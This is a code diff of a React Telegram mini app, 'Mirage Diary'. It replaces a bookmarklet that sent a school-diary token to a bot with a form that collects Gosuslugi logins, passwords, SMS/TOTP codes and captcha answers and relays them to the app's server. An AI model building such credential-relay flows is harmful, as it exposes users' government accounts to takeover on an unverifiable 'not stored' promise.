@@ -1,20 +1,22 @@
 import { useState, useEffect } from 'react';
-import { Shield, ExternalLink, CheckCircle2, AlertCircle, ChevronRight, Bookmark, Copy, RefreshCw } from 'lucide-react';
+import { Shield, CheckCircle2, AlertCircle, ChevronRight, RefreshCw, Lock, Phone } from 'lucide-react';
 
 const SERVER_URL = import.meta.env.VITE_SERVER_URL || 'http://localhost:5000';
-const DIARY_URL  = 'https://dnevnik.egov66.ru';
 
-type Step = 'welcome' | 'get-bookmarklet' | 'polling' | 'success' | 'error';
+type Step = 'welcome' | 'login' | 'polling' | 'otp' | 'captcha' | 'success' | 'error';
 
 export default function App() {
   const [step, setStep] = useState<Step>('welcome');
   const [tgUserId, setTgUserId] = useState('');
   const [tgFirstName, setTgFirstName] = useState('');
+
+  const [login, setLogin] = useState('');
+  const [password, setPassword] = useState('');
   
-  const [code, setCode] = useState('');
-  const [bookmarkletJs, setBookmarkletJs] = useState('');
+  const [sessionId, setSessionId] = useState('');
+  const [userInput, setUserInput] = useState('');
+  const [captchaImg, setCaptchaImg] = useState('');
   const [errorMsg, setErrorMsg] = useState('');
-  const [copied, setCopied] = useState(false);
 
   useEffect(() => {
     try {
@@ -23,7 +25,7 @@ export default function App() {
         tg.ready();
         tg.expand();
         const user = tg.initDataUnsafe?.user;
-        if (user?.id)         setTgUserId(String(user.id));
+        if (user?.id) setTgUserId(String(user.id));
         if (user?.first_name) setTgFirstName(user.first_name);
       } else {
         setTgUserId('123456789');
@@ -32,54 +34,72 @@ export default function App() {
     } catch { setTgUserId('123456789'); setTgFirstName('Тест'); }
   }, []);
 
-  // Poll for completion
+  // Poll for auth status
   useEffect(() => {
-    if (step !== 'polling' || !code) return;
+    if (step !== 'polling' || !sessionId) return;
+    
     const interval = setInterval(async () => {
       try {
-        const res = await fetch(`${SERVER_URL}/api/miniapp/poll-auth/${code}`);
+        const res = await fetch(`${SERVER_URL}/api/miniapp/auth/status/${sessionId}`);
         if (res.ok) {
           const data = await res.json();
-          if (data.done) {
+          if (data.status === 'Success') {
             clearInterval(interval);
             setStep('success');
             setTimeout(() => (window as any).Telegram?.WebApp?.close?.(), 3000);
+          } else if (data.status === 'RequiresOtp') {
+            clearInterval(interval);
+            setUserInput('');
+            setStep('otp');
+          } else if (data.status === 'RequiresCaptcha') {
+            clearInterval(interval);
+            setCaptchaImg(data.captchaImage);
+            setUserInput('');
+            setStep('captcha');
+          } else if (data.status === 'Failed' || data.status === 'Expired') {
+            clearInterval(interval);
+            setErrorMsg(data.errorMessage || 'Сессия истекла или произошла ошибка');
+            setStep('error');
           }
         }
       } catch { /* ignore poll errors */ }
     }, 2000);
     return () => clearInterval(interval);
-  }, [step, code]);
+  }, [step, sessionId]);
 
-  const handleStart = async () => {
-    setStep('polling'); // show loading state briefly
+  const handleStartAuth = async () => {
+    if (!login || !password) return;
+    setStep('polling');
+    setErrorMsg('');
     try {
-      const res = await fetch(`${SERVER_URL}/api/miniapp/create-code`, {
+      const res = await fetch(`${SERVER_URL}/api/miniapp/auth/start`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ TelegramUserId: tgUserId }),
+        body: JSON.stringify({ TelegramUserId: tgUserId, Login: login, Password: password }),
       });
       if (!res.ok) throw new Error(`HTTP ${res.status}`);
       const data = await res.json();
-      setCode(data.code);
-      setBookmarkletJs(data.bookmarkletJs);
-      setStep('get-bookmarklet');
+      setSessionId(data.sessionId);
     } catch (e: any) {
-      setErrorMsg('Не удалось получить код. ' + e.message);
+      setErrorMsg('Ошибка связи с сервером. ' + e.message);
       setStep('error');
     }
   };
 
-  const copyToClipboard = () => {
-    navigator.clipboard.writeText(bookmarkletJs).then(() => {
-      setCopied(true);
-      setTimeout(() => setCopied(false), 2000);
-    });
-  };
-
-  const openDiary = () => {
+  const handleSubmitInput = async () => {
+    if (!userInput) return;
     setStep('polling');
-    window.open(DIARY_URL, '_blank');
+    try {
+      const res = await fetch(`${SERVER_URL}/api/miniapp/auth/submit-input`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ SessionId: sessionId, Input: userInput }),
+      });
+      if (!res.ok) throw new Error(`HTTP ${res.status}`);
+    } catch (e: any) {
+      setErrorMsg('Ошибка отправки кода. ' + e.message);
+      setStep('error');
+    }
   };
 
   // ─── WELCOME ─────────────────────────────────────────────────────────────
@@ -90,68 +110,125 @@ export default function App() {
         <h1 className="app-title">Mirage Diary</h1>
         <p className="app-sub">
           {tgFirstName ? `Привет, ${tgFirstName}! ` : ''}
-          Авторизация в один клик.
+          Подключите дневник через Госуслуги.
         </p>
       </div>
 
       <div className="steps-card">
-        <div className="step-row"><span className="step-badge">1</span><span>Сохраните спец-ссылку</span></div>
-        <div className="step-row"><span className="step-badge">2</span><span>Зайдите в дневник через Госуслуги</span></div>
-        <div className="step-row"><span className="step-badge">3</span><span>Откройте сохраненную ссылку</span></div>
+        <div className="step-row"><span className="step-badge">1</span><span>Введите логин и пароль от Госуслуг</span></div>
+        <div className="step-row"><span className="step-badge">2</span><span>Мы безопасно получим токен дневника</span></div>
+        <div className="step-row"><span className="step-badge">3</span><span>Пароль нигде не сохраняется</span></div>
       </div>
 
-      <button className="btn-primary" onClick={handleStart}>
-        Начать <ChevronRight size={18} />
+      <button className="btn-primary" onClick={() => setStep('login')}>
+        Продолжить <ChevronRight size={18} />
       </button>
     </div>
   );
 
-  // ─── GET BOOKMARKLET ─────────────────────────────────────────────────────
-  if (step === 'get-bookmarklet') return (
+  // ─── LOGIN ─────────────────────────────────────────────────────────────
+  if (step === 'login') return (
     <div className="screen">
       <div className="logo-wrap">
-        <div className="logo-circle logo-circle--amber"><Bookmark size={32} className="logo-icon" /></div>
-        <h1 className="app-title">Скопируйте скрипт</h1>
-        <p className="app-sub">Это безопасно — код только отправляет ваш токен боту</p>
+        <div className="logo-circle logo-circle--amber"><Lock size={32} className="logo-icon" /></div>
+        <h1 className="app-title">Госуслуги</h1>
+        <p className="app-sub">Введите данные для входа</p>
       </div>
 
-      <div className="instruction-card">
-        <p className="instruction-label">1. Скопируйте этот код:</p>
-        <button className="copy-btn" onClick={copyToClipboard}>
-          {copied ? <><CheckCircle2 size={16} /> Скопировано</> : <><Copy size={16} /> Скопировать</>}
-        </button>
+      <div className="input-group">
+        <label className="input-label">Телефон, Email или СНИЛС</label>
+        <input 
+          type="text" 
+          className="text-input" 
+          value={login} 
+          onChange={(e) => setLogin(e.target.value)} 
+          placeholder="Например, +7 (999) 000-00-00" 
+        />
       </div>
 
-      <div className="instruction-card mt-2">
-        <p className="instruction-label">2. Создайте закладку в браузере:</p>
-        <ol className="instruction-list">
-          <li>Создайте любую закладку</li>
-          <li>Измените её <strong>Адрес (URL)</strong></li>
-          <li>Вставьте туда скопированный скрипт</li>
-        </ol>
+      <div className="input-group mt-4">
+        <label className="input-label">Пароль</label>
+        <input 
+          type="password" 
+          className="text-input" 
+          value={password} 
+          onChange={(e) => setPassword(e.target.value)} 
+          placeholder="••••••••" 
+        />
       </div>
 
-      <button className="btn-primary btn-green mt-4" onClick={openDiary}>
-        3. Открыть дневник <ExternalLink size={16} />
+      <button className="btn-primary mt-6" onClick={handleStartAuth} disabled={!login || !password}>
+        Войти
+      </button>
+      <button className="btn-ghost mt-2" onClick={() => setStep('welcome')}>Отмена</button>
+    </div>
+  );
+
+  // ─── OTP / 2FA ─────────────────────────────────────────────────────────────
+  if (step === 'otp') return (
+    <div className="screen">
+      <div className="logo-wrap">
+        <div className="logo-circle logo-circle--amber"><Phone size={32} className="logo-icon" /></div>
+        <h1 className="app-title">Проверка безопасности</h1>
+        <p className="app-sub">Введите код из СМС или TOTP приложения</p>
+      </div>
+
+      <div className="input-group mt-4">
+        <input 
+          type="text" 
+          className="text-input text-center text-lg" 
+          value={userInput} 
+          onChange={(e) => setUserInput(e.target.value)} 
+          placeholder="000000" 
+          maxLength={6}
+          autoFocus
+        />
+      </div>
+
+      <button className="btn-primary mt-6" onClick={handleSubmitInput} disabled={userInput.length < 4}>
+        Подтвердить
       </button>
     </div>
   );
 
-  // ─── POLLING ─────────────────────────────────────────────────────────────
+  // ─── CAPTCHA ─────────────────────────────────────────────────────────────
+  if (step === 'captcha') return (
+    <div className="screen">
+      <div className="logo-wrap">
+        <div className="logo-circle logo-circle--amber"><Shield size={32} className="logo-icon" /></div>
+        <h1 className="app-title">Защита от роботов</h1>
+        <p className="app-sub">Введите текст с картинки</p>
+      </div>
+
+      <div className="captcha-container mt-4">
+        {captchaImg && <img src={`data:image/jpeg;base64,${captchaImg}`} alt="Captcha" className="captcha-img" />}
+      </div>
+
+      <div className="input-group mt-4">
+        <input 
+          type="text" 
+          className="text-input text-center text-lg" 
+          value={userInput} 
+          onChange={(e) => setUserInput(e.target.value)} 
+          placeholder="Текст с картинки" 
+          autoFocus
+        />
+      </div>
+
+      <button className="btn-primary mt-6" onClick={handleSubmitInput} disabled={!userInput}>
+        Продолжить
+      </button>
+    </div>
+  );
+
+  // ─── POLLING (LOADING) ───────────────────────────────────────────────────
   if (step === 'polling') return (
     <div className="screen screen-center">
       <div className="spinner-wrap">
         <div className="spinner-ring" />
       </div>
-      <p className="sync-title">Ожидаю авторизации...</p>
-      <p className="sync-sub mt-2">
-        1. Войдите в дневник<br/>
-        2. Откройте сохранённую закладку
-      </p>
-      <div className="code-box mt-4">Код сессии: {code}</div>
-      <button className="btn-ghost mt-4" onClick={() => setStep('get-bookmarklet')}>
-        Показать инструкцию
-      </button>
+      <p className="sync-title">Связываюсь с Госуслугами...</p>
+      <p className="sync-sub mt-2">Пожалуйста, подождите. Это может занять до 30 секунд.</p>
     </div>
   );
 
@@ -161,8 +238,8 @@ export default function App() {
       <div className="success-circle">
         <CheckCircle2 size={52} className="success-icon" />
       </div>
-      <h2 className="success-title">Готово!</h2>
-      <p className="success-sub mt-2">Дневник успешно подключён. Окно закроется автоматически.</p>
+      <h2 className="success-title">Успешно!</h2>
+      <p className="success-sub mt-2">Вы вошли в систему. Окно закроется автоматически.</p>
     </div>
   );
 
@@ -172,9 +249,9 @@ export default function App() {
       <div className="error-circle">
         <AlertCircle size={52} className="error-icon" />
       </div>
-      <h2 className="error-title">Ошибка</h2>
+      <h2 className="error-title">Ошибка входа</h2>
       <p className="error-sub mt-2">{errorMsg}</p>
-      <button className="btn-primary" onClick={handleStart}>
+      <button className="btn-primary mt-6" onClick={() => setStep('login')}>
         <RefreshCw size={16} /> Попробовать снова
       </button>
     </div>
